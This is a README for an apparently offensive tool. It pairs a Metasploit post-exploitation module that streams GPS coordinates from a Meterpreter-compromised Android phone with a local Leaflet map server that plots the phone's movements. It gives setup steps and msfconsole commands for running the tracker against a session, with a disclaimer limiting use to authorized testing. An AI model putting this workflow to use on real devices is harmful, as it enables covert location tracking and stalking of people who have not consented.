# msf-gps-map

Local telemetry ingestion server and Metasploit post-exploitation module.

## Data Pipeline

1. **Target:** An Android device runs the Meterpreter stager and
   connects back to your Metasploit handler.
2. **Operator (MSF):** The `gps_streamer` post module runs in a
   background job, periodically pulling coordinates from the session
   via `geolocate`.
3. **Ingestion:** The module issues an HTTP POST with JSON data
   (`{"lat": ..., "lon": ...}`) to the local server.
4. **Visualization:** `map_server.py` receives the payload, stores it
   in RAM, and `index.html` (Leaflet) polls `/api/points` to render
   the path on a local map.

## Tree

```
.
├── gps_streamer.rb       # Metasploit module (pulls GPS from session & pushes via HTTP)
├── index.html            # Frontend Leaflet map interface
├── Makefile              # Automates offline asset vendoring & MSF module installation
├── map_server.py         # Python telemetry backend (RAM-only store, loopback bound)
├── README.md
└── vendor_leaflet.py     # Fetches & verifies offline Leaflet 1.9.4 assets
```

## Setup

### 1. Fetch and verify offline Leaflet assets.

```sh
make
```

### 2. Install the Metasploit post module into your local tree (`~/.msf4/modules`):

```sh
make install-local
```

## Usage

### 1. Start the Map Server.

```sh
python3 map_server.py
```

Open <http://127.0.0.1:8765> in a browser.

> [!IMPORTANT]
> Requires internet connection for OpenStreetMap tiles.

### 2. Run the Metasploit Streamer.
   
In `msfconsole`:

```
msf6 > reload_all
msf6 > use post/android/gather/gps_streamer
msf6 post(android/gather/gps_streamer) > set SESSION <id>
msf6 post(android/gather/gps_streamer) > set INTERVAL 3
msf6 post(android/gather/gps_streamer) > run -j
```

### 3. Manual Testing (`curl`).

To test the ingestion server without an active session:

```sh
curl -fsS http://127.0.0.1:8765/api/position \
     -H 'Content-Type: application/json' \
     -d '{"lat":47.000,"lon":28.000}'
```

## Specifications

* **Storage:** In-memory queue
  (RAM only, capped at 1,000 points; wiped on exit).
* **Security:** Bound strictly to 127.0.0.1. Validates incoming Host
  and Origin headers.
* **Endpoints:**
  - `GET /api/points`
  - `POST /api/position`

## Disclaimer

This software is designed strictly for authorized security research,
educational demonstrations, and professional penetration testing with explicit
prior consent. Unauthorized tracking, surveillance, or deployment against
targets without explicit authorization is illegal. The author assumes no
liability for misuse.

## License

This project is free software licensed under the terms of the
**GNU General Public License v3.0 or later (GPL-3.0-or-later)**.
See the `COPYING` for license terms and `COPYRIGHT` for notices.

Vendored Leaflet assets (`vendor/leaflet/`) are distributed under their
respective BSD-2-Clause license.

## Acknowledgments

* **Leaflet.js** for providing an exceptionally modular interactive mapping library.
* **OpenStreetMap** contributors for map tile infrastructure.
* **Rapid7 Metasploit Framework** for the post-exploitation framework architecture.
